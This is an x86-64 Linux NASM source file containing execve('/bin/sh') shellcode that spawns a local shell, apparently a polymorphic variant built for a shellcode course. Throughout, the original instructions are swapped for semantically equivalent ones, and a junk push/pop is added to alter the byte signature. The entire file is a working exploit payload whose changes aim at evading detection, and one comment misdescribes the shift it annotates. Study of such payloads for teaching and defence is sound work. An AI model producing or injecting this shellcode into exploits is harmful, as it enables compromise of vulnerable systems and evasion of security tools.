; David @InfinitelyManic
;
section .text
	global _start

_start:
	;xor   rdx, rdx
	;--------------
	cdq				; symantically equiv; rax = 0 is implied so edx is set to 0

	mov	qword rbx, '//bin/sh'	; extra / to bring to 8 chars  
	shr	rbx, 0x8		; shift off byte 0x48

	push byte 0x90			; symantically equiv
	pop rcx				; symantically equiv

	push	rbx			; filename
	mov	rdi, rsp		; filename 
	push	rax			; nulls
	push	rdi			; second 
	mov	rsi, rsp		; execve struct

	; mov al,	0x3b			; execve syscall  
	; ------------
	push byte 0x3b			;  symantically equiv
	pop rax				;  symantically equiv

	syscall

